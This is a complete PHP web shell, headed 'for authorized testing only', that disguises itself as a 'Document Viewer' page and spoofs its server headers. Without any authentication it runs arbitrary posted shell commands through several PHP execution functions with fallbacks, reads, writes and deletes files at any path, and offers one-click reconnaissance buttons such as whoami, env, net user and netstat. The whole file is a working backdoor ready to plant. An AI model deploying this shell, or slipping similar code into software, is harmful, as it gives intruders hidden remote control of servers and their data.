<?php
// ULTRA ADVANCED RED TEAM WEB SHELL - FOR AUTHORIZED TESTING ONLY
header('Content-Type: text/html; charset=utf-8');
header('X-Powered-By: Apache/2.4.1 (Win32)');
header('Server: Microsoft-IIS/10.0');

session_start();

// Initialize command history in session
if (!isset($_SESSION['command_history'])) {
    $_SESSION['command_history'] = [];
}

// Enhanced command execution with multiple fallbacks
function executeCommand($cmd) {
    $output = '';
    $status = 0;
    
    if (!empty($cmd)) {
        // Try multiple execution methods with priority
        if (function_exists('shell_exec')) {
            $output = shell_exec($cmd . " 2>&1");
        } elseif (function_exists('system')) {
            ob_start();
            system($cmd . " 2>&1", $status);
            $output = ob_get_contents();
            ob_end_clean();
        } elseif (function_exists('exec')) {
            exec($cmd . " 2>&1", $output_array, $status);
            $output = implode("\n", $output_array);
        } elseif (function_exists('passthru')) {
            ob_start();
            passthru($cmd . " 2>&1", $status);
            $output = ob_get_contents();
            ob_end_clean();
        } elseif (function_exists('popen')) {
            $handle = popen($cmd . " 2>&1", 'r');
            $output = '';
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
        }
    }
    
    return [
        'output' => $output ?: 'Command executed (no output)',
        'status' => $status,
        'command' => $cmd
    ];
}

// Advanced file operations
function fileOperation($action, $path, $content = '') {
    switch($action) {
        case 'read':
            return file_exists($path) ? 
                ["success" => true, "data" => file_get_contents($path)] : 
                ["success" => false, "error" => "File not found"];
            
        case 'write':
            $result = file_put_contents($path, $content);
            return $result !== false ? 
                ["success" => true, "message" => "File written successfully"] : 
                ["success" => false, "error" => "Write failed"];
            
        case 'delete':
            return unlink($path) ? 
                ["success" => true, "message" => "File deleted"] : 
                ["success" => false, "error" => "Delete failed"];
            
        case 'list':
            if (!is_dir($path)) {
                return ["success" => false, "error" => "Not a directory"];
            }
            $files = scandir($path);
            $result = [];
            foreach($files as $file) {
                if($file != "." && $file != "..") {
                    $fullPath = $path . DIRECTORY_SEPARATOR . $file;
                    $result[] = [
                        'name' => $file,
                        'size' => filesize($fullPath),
                        'perms' => substr(sprintf('%o', fileperms($fullPath)), -4),
                        'type' => is_dir($fullPath) ? 'dir' : 'file',
                        'time' => date('Y-m-d H:i:s', filemtime($fullPath))
                    ];
                }
            }
            return ["success" => true, "files" => $result];
    }
}

// Handle all types of operations
$result = null;
if (isset($_POST['operation'])) {
    $operation = $_POST['operation'];
    
    switch($operation) {
        case 'command':
            $command = $_POST['cmd'];
            $result = executeCommand($command);
            // Store command in history after execution (not before)
            if (!empty($command)) {
                $_SESSION['command_history'][] = [
                    'command' => $command,
                    'time' => date('H:i:s'),
                    'output' => $result['output'],
                    'status' => $result['status']
                ];
                
                // Keep only last 50 commands
                if (count($_SESSION['command_history']) > 50) {
                    array_shift($_SESSION['command_history']);
                }
            }
            break;
            
        case 'file_op':
            $fileResult = fileOperation(
                $_POST['file_action'], 
                $_POST['file_path'], 
                $_POST['file_content'] ?? ''
            );
            $result = [
                'output' => $fileResult['success'] ? 
                    (isset($fileResult['data']) ? $fileResult['data'] : 
                     (isset($fileResult['files']) ? json_encode($fileResult['files'], JSON_PRETTY_PRINT) : 
                      $fileResult['message'])) : 
                    "Error: " . $fileResult['error'],
                'status' => $fileResult['success'] ? 0 : 1,
                'command' => 'File operation: ' . $_POST['file_action'] . ' ' . $_POST['file_path']
            ];
            // Store file operation in history
            $_SESSION['command_history'][] = [
                'command' => $result['command'],
                'time' => date('H:i:s'),
                'output' => $result['output'],
                'status' => $result['status']
            ];
            break;
            
        case 'clear_history':
            $_SESSION['command_history'] = [];
            $result = [
                'output' => 'Command history cleared',
                'status' => 0,
                'command' => 'clear_history'
            ];
            break;
    }
}

$currentDir = getcwd();
$serverSoftware = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
$phpUser = @get_current_user() ?: 'Unknown';
$isWindows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
$privileges = (function_exists('posix_getuid') && posix_getuid() == 0) ? 'ROOT' : ($isWindows ? 'ADMIN' : 'USER');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Viewer</title>
    <style>
        :root {
            --primary: #00ff88;
            --secondary: #ff4444;
            --accent: #ffaa00;
            --background: #0a0a12;
            --surface: #1a1a2e;
            --text: #e0e0ff;
            --success: #00ff88;
            --error: #ff4444;
            --warning: #ffaa00;
            --info: #4488ff;
            --terminal-bg: #000000;
            --terminal-border: #00ff88;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
            background: var(--background);
            color: var(--text);
            height: 100vh;
            overflow: hidden;
            background-image: 
                radial-gradient(circle at 20% 80%, rgba(255, 68, 68, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(0, 255, 136, 0.1) 0%, transparent 50%),
                linear-gradient(45deg, rgba(10, 10, 18, 0.9), rgba(26, 26, 46, 0.9));
        }
        
        .terminal {
            height: 100vh;
            display: flex;
            flex-direction: column;
            background: rgba(10, 10, 18, 0.95);
            border: 1px solid var(--primary);
            position: relative;
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, var(--secondary), var(--primary));
            padding: 8px 15px;
            border-bottom: 2px solid var(--primary);
            position: relative;
            overflow: hidden;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: shine 3s infinite;
        }
        
        @keyframes shine {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        
        .header h1 {
            font-size: 13px;
            color: #000;
            font-weight: bold;
            position: relative;
            z-index: 1;
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
        }
        
        .system-info {
            font-size: 10px;
            color: #000;
            display: flex;
            justify-content: space-between;
            position: relative;
            z-index: 1;
            flex-wrap: wrap;
        }
        
        .main-container {
            display: flex;
            flex: 1;
            overflow: hidden;
        }
        
        .sidebar {
            width: 280px;
            background: var(--surface);
            border-right: 1px solid var(--secondary);
            padding: 12px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .content-area {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        
        .tab-bar {
            display: flex;
            background: var(--surface);
            border-bottom: 1px solid var(--primary);
        }
        
        .tab {
            padding: 10px 20px;
            background: transparent;
            border: none;
            color: var(--text);
            cursor: pointer;
            border-right: 1px solid #333;
            font-size: 11px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .tab::before {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            width: 0;
            height: 2px;
            background: var(--primary);
            transition: all 0.3s ease;
            transform: translateX(-50%);
        }
        
        .tab:hover::before {
            width: 80%;
        }
        
        .tab.active {
            background: rgba(0, 255, 136, 0.1);
            color: var(--primary);
        }
        
        .tab.active::before {
            width: 100%;
        }
        
        .tab-content {
            flex: 1;
            display: none;
            flex-direction: column;
            overflow: hidden;
        }
        
        .tab-content.active {
            display: flex;
        }
        
        .module {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--primary);
            border-radius: 8px;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        
        .module:hover {
            border-color: var(--accent);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
        }
        
        .module-header {
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1), rgba(255, 68, 68, 0.1));
            padding: 10px 15px;
            border-bottom: 1px solid var(--primary);
            font-size: 11px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s ease;
        }
        
        .module-header:hover {
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.2), rgba(255, 68, 68, 0.2));
        }
        
        .module-content {
            padding: 12px;
            display: none;
        }
        
        .module.active .module-content {
            display: block;
        }
        
        .terminal-output {
            flex: 1;
            overflow-y: auto;
            padding: 15px;
            background: var(--terminal-bg);
            border: 1px solid var(--terminal-border);
            margin: 10px;
            border-radius: 8px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            line-height: 1.4;
        }
        
        .command-line {
            display: flex;
            align-items: center;
            padding: 10px 15px;
            background: var(--surface);
            border-top: 2px solid var(--secondary);
            gap: 10px;
        }
        
        .prompt {
            color: var(--primary);
            font-weight: bold;
            white-space: nowrap;
            text-shadow: 0 0 5px var(--primary);
        }
        
        .command-input {
            flex: 1;
            background: transparent;
            border: none;
            color: var(--text);
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            outline: none;
            padding: 5px;
        }
        
        .quick-actions {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
            gap: 6px;
            padding: 8px;
        }
        
        .quick-btn {
            background: linear-gradient(135deg, rgba(255, 68, 68, 0.1), rgba(0, 255, 136, 0.1));
            border: 1px solid var(--secondary);
            color: var(--text);
            padding: 8px 6px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 10px;
            text-align: center;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .quick-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            transition: left 0.5s;
        }
        
        .quick-btn:hover::before {
            left: 100%;
        }
        
        .quick-btn:hover {
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
            transform: translateY(-2px);
        }
        
        .form-group {
            margin-bottom: 10px;
        }
        
        .form-label {
            display: block;
            font-size: 10px;
            margin-bottom: 4px;
            color: var(--accent);
            font-weight: bold;
        }
        
        .form-control {
            width: 100%;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #333;
            color: var(--text);
            padding: 6px 8px;
            font-size: 11px;
            border-radius: 4px;
            font-family: 'JetBrains Mono', monospace;
            transition: all 0.3s ease;
        }
        
        .form-control:focus {
            border-color: var(--primary);
            box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
            outline: none;
        }
        
        .btn {
            background: linear-gradient(135deg, var(--primary), var(--accent));
            color: #000;
            border: none;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 11px;
            font-weight: bold;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            transition: left 0.5s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, var(--secondary), #ff6b6b);
            color: #fff;
        }
        
        .status-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 6px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .status-online { background: var(--success); }
        .status-offline { background: var(--error); }
        .status-warning { background: var(--warning); }
        
        .matrix-rain {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            opacity: 0.03;
        }
        
        /* Advanced scrollbar */
        ::-webkit-scrollbar {
            width: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: #000;
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(180deg, var(--primary), var(--secondary));
            border-radius: 5px;
            border: 2px solid #000;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(180deg, var(--accent), var(--primary));
        }
        
        .connection-status {
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.9);
            padding: 6px 12px;
            border: 1px solid var(--primary);
            border-radius: 6px;
            font-size: 10px;
            z-index: 1000;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }
        
        .output-line {
            margin-bottom: 8px;
            padding: 4px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .command-entry {
            color: var(--primary);
            font-weight: bold;
            margin-bottom: 4px;
        }
        
        .command-output {
            color: var(--text);
            white-space: pre-wrap;
            font-family: 'JetBrains Mono', monospace;
        }
        
        .command-meta {
            color: var(--accent);
            font-size: 10px;
            margin-top: 2px;
        }
        
        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 4px 8px;
            margin: 2px 0;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 4px;
            font-size: 11px;
        }
        
        .file-name {
            flex: 1;
            color: var(--text);
        }
        
        .file-size {
            color: var(--accent);
            font-size: 10px;
        }
        
        .file-type {
            color: var(--primary);
            font-size: 10px;
            margin-left: 8px;
        }

        .welcome-message {
            color: var(--accent);
            margin-bottom: 15px;
            padding: 10px;
            background: rgba(0, 255, 136, 0.1);
            border-radius: 5px;
            border-left: 3px solid var(--primary);
        }
    </style>
</head>
<body>
    <div class="matrix-rain" id="matrixRain"></div>
    <div class="connection-status">
        <span class="status-indicator status-online"></span>
        ACTIVE | <?php echo $privileges; ?> | STEALTH MODE
    </div>
    
    <div class="terminal">
        <div class="header">
            <h1>🛡️ NEXUS TERMINAL v4.0 | SESSION: <?php echo substr(md5(time()), 0, 8); ?> | TARGET: <?php echo $_SERVER['HTTP_HOST'] ?? 'LOCAL'; ?></h1>
            <div class="system-info">
                <span>OS: <?php echo php_uname('s'); ?> | PHP: <?php echo PHP_VERSION; ?></span>
                <span>USER: <?php echo $phpUser; ?> | PRIV: <?php echo $privileges; ?></span>
                <span>DIR: <?php echo $currentDir; ?> | TIME: <?php echo date('H:i:s'); ?></span>
            </div>
        </div>
        
        <div class="main-container">
            <div class="sidebar">
                <div class="module active">
                    <div class="module-header" onclick="toggleModule(this)">
                        ⚡ QUICK ACTIONS
                    </div>
                    <div class="module-content">
                        <div class="quick-actions">
                            <div class="quick-btn" onclick="executeQuick('whoami')">WHOAMI</div>
                            <div class="quick-btn" onclick="executeQuick('pwd')">PWD</div>
                            <div class="quick-btn" onclick="executeQuick('ls -la')">LIST FILES</div>
                            <div class="quick-btn" onclick="executeQuick('ipconfig')">NETWORK INFO</div>
                            <div class="quick-btn" onclick="executeQuick('netstat -an')">NETSTAT</div>
                            <div class="quick-btn" onclick="executeQuick('systeminfo')">SYSTEM INFO</div>
                            <div class="quick-btn" onclick="executeQuick('ps aux')">PROCESSES</div>
                            <div class="quick-btn" onclick="executeQuick('uname -a')">KERNEL INFO</div>
                            <div class="quick-btn" onclick="executeQuick('env')">ENVIRONMENT</div>
                            <div class="quick-btn" onclick="executeQuick('df -h')">DISK SPACE</div>
                            <div class="quick-btn" onclick="executeQuick('free -h')">MEMORY</div>
                            <div class="quick-btn" onclick="showFileManager()">FILE MANAGER</div>
                        </div>
                    </div>
                </div>
                
                <div class="module">
                    <div class="module-header" onclick="toggleModule(this)">
                        🗂️ FILE MANAGER
                    </div>
                    <div class="module-content">
                        <div class="form-group">
                            <label class="form-label">File Path</label>
                            <input type="text" id="filePath" class="form-control" placeholder="<?php echo $currentDir; ?>" value="<?php echo $currentDir; ?>">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Action</label>
                            <select id="fileAction" class="form-control">
                                <option value="list">List Directory</option>
                                <option value="read">Read File</option>
                                <option value="write">Write File</option>
                                <option value="delete">Delete File</option>
                            </select>
                        </div>
                        <div class="form-group" id="fileContentGroup" style="display:none;">
                            <label class="form-label">Content</label>
                            <textarea id="fileContent" class="form-control" rows="4" placeholder="File content..."></textarea>
                        </div>
                        <button class="btn" onclick="performFileOp()">Execute</button>
                    </div>
                </div>
                
                <div class="module">
                    <div class="module-header" onclick="toggleModule(this)">
                        🔧 SYSTEM TOOLS
                    </div>
                    <div class="module-content">
                        <div class="quick-actions">
                            <div class="quick-btn" onclick="executeQuick('wmic process get name,processid')">PROCESS LIST</div>
                            <div class="quick-btn" onclick="executeQuick('net user')">USER ACCOUNTS</div>
                            <div class="quick-btn" onclick="executeQuick('schtasks /query')">SCHEDULED TASKS</div>
                            <div class="quick-btn" onclick="executeQuick('service --status-all')">SERVICES</div>
                            <div class="quick-btn" onclick="executeQuick('arp -a')">ARP TABLE</div>
                            <div class="quick-btn" onclick="executeQuick('route print')">ROUTING TABLE</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="content-area">
                <div class="tab-bar">
                    <button class="tab active" onclick="switchTab('terminal')">TERMINAL</button>
                    <button class="tab" onclick="switchTab('filemanager')">FILE MANAGER</button>
                    <button class="tab" onclick="switchTab('system')">SYSTEM INFO</button>
                    <button class="tab" onclick="switchTab('network')">NETWORK</button>
                </div>
                
                <div id="terminal" class="tab-content active">
                    <div class="terminal-output" id="terminalOutput">
                        <div class="welcome-message">
                            <strong>// NEXUS TERMINAL ACTIVE // SESSION: <?php echo substr(md5(time()), 0, 8); ?> //</strong><br>
                            <em>Type commands below or use quick actions</em>
                        </div>
                        
                        <!-- Command History - Only show previous commands, current result is handled separately -->
                        <?php 
                        // Only show history entries that are NOT the current result
                        $historyToShow = $_SESSION['command_history'];
                        if ($result && !empty($historyToShow)) {
                            // Remove the last entry if it matches the current result (to prevent duplicates)
                            $lastHistory = end($historyToShow);
                            if ($lastHistory && $lastHistory['command'] === $result['command']) {
                                array_pop($historyToShow);
                            }
                        }
                        
                        foreach (array_reverse($historyToShow) as $history): 
                        ?>
                        <div class="output-line">
                            <div class="command-entry">
                                <span style="color: var(--primary);">❯</span> <?php echo htmlspecialchars($history['command']); ?>
                            </div>
                            <div class="command-output">
                                <?php echo htmlspecialchars($history['output']); ?>
                            </div>
                            <div class="command-meta">
                                ⚡ Executed at <?php echo $history['time']; ?> | Exit code: <?php echo $history['status']; ?>
                            </div>
                        </div>
                        <?php endforeach; ?>
                        
                        <!-- Current Result - Only show if exists and not already in history -->
                        <?php if ($result && (!empty($_SESSION['command_history']) && end($_SESSION['command_history'])['command'] !== $result['command'])): ?>
                        <div class="output-line">
                            <div class="command-entry">
                                <span style="color: var(--primary);">❯</span> <?php echo htmlspecialchars($result['command']); ?>
                            </div>
                            <div class="command-output">
                                <?php echo htmlspecialchars($result['output']); ?>
                            </div>
                            <div class="command-meta">
                                ⚡ Executed at <?php echo date('H:i:s'); ?> | Exit code: <?php echo $result['status']; ?>
                            </div>
                        </div>
                        <?php endif; ?>
                    </div>
                    
                    <form method="POST" class="command-line" id="commandForm">
                        <input type="hidden" name="operation" value="command">
                        <span class="prompt"><?php echo $isWindows ? 'C:\>' : '$'; ?></span>
                        <input type="text" name="cmd" class="command-input" placeholder="Enter command..." autofocus autocomplete="off" id="cmdInput">
                        <button type="submit" class="btn" style="padding: 6px 12px;">Execute</button>
                        <button type="button" class="btn btn-danger" onclick="clearHistory()" style="padding: 6px 12px;">Clear History</button>
                    </form>
                </div>
                
                <div id="filemanager" class="tab-content">
                    <div class="terminal-output">
                        <h3 style="color: var(--primary); margin-bottom: 15px;">File Manager</h3>
                        <div id="fileManagerOutput">
                            <!-- File operations output will appear here -->
                        </div>
                    </div>
                </div>

                <div id="system" class="tab-content">
                    <div class="terminal-output">
                        <h3 style="color: var(--primary); margin-bottom: 15px;">System Information</h3>
                        <div class="output-line">
                            <div class="command-output">
<?php
echo "Operating System: " . php_uname('s') . "\n";
echo "Host Name: " . php_uname('n') . "\n";
echo "Version: " . php_uname('v') . "\n";
echo "Architecture: " . php_uname('m') . "\n";
echo "PHP Version: " . PHP_VERSION . "\n";
echo "Web Server: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') . "\n";
echo "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
echo "Current User: " . $phpUser . "\n";
echo "Privileges: " . $privileges . "\n";
echo "Current Directory: " . $currentDir . "\n";
?>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="network" class="tab-content">
                    <div class="terminal-output">
                        <h3 style="color: var(--primary); margin-bottom: 15px;">Network Information</h3>
                        <div class="output-line">
                            <div class="command-output">
<?php
if ($isWindows) {
    echo "Use 'ipconfig' command for network details\n";
} else {
    echo "Use 'ifconfig' or 'ip addr' command for network details\n";
}
echo "Server IP: " . ($_SERVER['SERVER_ADDR'] ?? 'Unknown') . "\n";
echo "Client IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n";
echo "Host: " . ($_SERVER['HTTP_HOST'] ?? 'Unknown') . "\n";
?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Matrix rain background
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.className = 'matrix-rain';
        document.getElementById('matrixRain').appendChild(canvas);
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        
        const chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz$#@%&*";
        const charArray = chars.split("");
        const fontSize = 12;
        const columns = canvas.width / fontSize;
        const drops = [];
        
        for(let i = 0; i < columns; i++) {
            drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
        }
        
        function drawMatrix() {
            ctx.fillStyle = "rgba(10, 10, 18, 0.04)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = "#00ff88";
            ctx.font = fontSize + "px monospace";
            
            for(let i = 0; i < drops.length; i++) {
                const text = charArray[Math.floor(Math.random() * charArray.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 50);
        
        // Terminal functionality
        function scrollToBottom() {
            const output = document.getElementById('terminalOutput');
            output.scrollTop = output.scrollHeight;
        }
        
        document.getElementById('cmdInput').focus();
        window.onload = function() {
            scrollToBottom();
        };
        
        document.getElementById('commandForm').addEventListener('submit', function() {
            setTimeout(scrollToBottom, 100);
        });
        
        // Tab switching
        function switchTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
            
            // Auto-focus command input when switching to terminal tab
            if (tabName === 'terminal') {
                setTimeout(() => {
                    document.getElementById('cmdInput').focus();
                }, 100);
            }
        }
        
        // Module toggling
        function toggleModule(header) {
            const module = header.parentElement;
            module.classList.toggle('active');
        }
        
        // Quick actions
        function executeQuick(cmd) {
            document.getElementById('cmdInput').value = cmd;
            document.querySelector('input[name="operation"]').value = 'command';
            document.getElementById('commandForm').submit();
        }
        
        function showFileManager() {
            switchTab('filemanager');
        }
        
        // File operations
        document.getElementById('fileAction').addEventListener('change', function() {
            const contentGroup = document.getElementById('fileContentGroup');
            contentGroup.style.display = this.value === 'write' ? 'block' : 'none';
        });
        
        function performFileOp() {
            const action = document.getElementById('fileAction').value;
            const path = document.getElementById('filePath').value;
            const content = document.getElementById('fileContent').value;
            
            const form = document.createElement('form');
            form.method = 'POST';
            form.style.display = 'none';
            
            const opInput = document.createElement('input');
            opInput.name = 'operation';
            opInput.value = 'file_op';
            form.appendChild(opInput);
            
            const actionInput = document.createElement('input');
            actionInput.name = 'file_action';
            actionInput.value = action;
            form.appendChild(actionInput);
            
            const pathInput = document.createElement('input');
            pathInput.name = 'file_path';
            pathInput.value = path;
            form.appendChild(pathInput);
            
            if (action === 'write') {
                const contentInput = document.createElement('input');
                contentInput.name = 'file_content';
                contentInput.value = content;
                form.appendChild(contentInput);
            }
            
            document.body.appendChild(form);
            form.submit();
        }
        
        // Clear history
        function clearHistory() {
            const form = document.createElement('form');
            form.method = 'POST';
            form.style.display = 'none';
            
            const opInput = document.createElement('input');
            opInput.name = 'operation';
            opInput.value = 'clear_history';
            form.appendChild(opInput);
            
            document.body.appendChild(form);
            form.submit();
        }
        
        // Command history with arrow keys
        let commandHistory = [];
        let historyIndex = -1;
        
        document.getElementById('cmdInput').addEventListener('keydown', function(e) {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (commandHistory.length > 0) {
                    if (historyIndex === -1) {
                        historyIndex = commandHistory.length - 1;
                    } else if (historyIndex > 0) {
                        historyIndex--;
                    }
                    this.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (commandHistory.length > 0 && historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex];
                } else {
                    historyIndex = -1;
                    this.value = '';
                }
            } else if (e.key === 'Enter') {
                const cmd = this.value.trim();
                if (cmd) {
                    commandHistory.push(cmd);
                    historyIndex = -1;
                    // Auto-scroll after command execution
                    setTimeout(scrollToBottom, 100);
                }
            } else if (e.key === 'Tab') {
                e.preventDefault();
                // Basic tab completion could be implemented here
            }
        });
        
        // Auto-completion for common commands
        const commandSuggestions = [
            'whoami', 'pwd', 'ls', 'dir', 'cd', 'cat', 'type',
            'ipconfig', 'ifconfig', 'netstat', 'ps', 'tasklist',
            'systeminfo', 'uname', 'phpinfo', 'id', 'who', 'w'
        ];
        
        // Stealth mode - random user activity simulation
        function simulateUserActivity() {
            setInterval(() => {
                document.title = Math.random() > 0.5 ? "Document Viewer" : "Apache/2.4.1 - Document Root";
            }, 5000);
        }
        simulateUserActivity();
        
        // Enhanced terminal features
        function enhanceTerminal() {
            // Double click to select all in output
            const terminalOutput = document.getElementById('terminalOutput');
            terminalOutput.addEventListener('dblclick', function() {
                const selection = window.getSelection();
                const range = document.createRange();
                range.selectNodeContents(this);
                selection.removeAllRanges();
                selection.addRange(range);
            });
            
            // Right click context menu for common actions
            terminalOutput.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                // Could implement context menu here
            });
        }
        enhanceTerminal();
        
        // Auto-clear input after successful execution
        const originalSubmit = document.getElementById('commandForm').onsubmit;
        document.getElementById('commandForm').onsubmit = function(e) {
            setTimeout(() => {
                document.getElementById('cmdInput').value = '';
            }, 100);
            return true;
        };
    </script>
</body>
</html>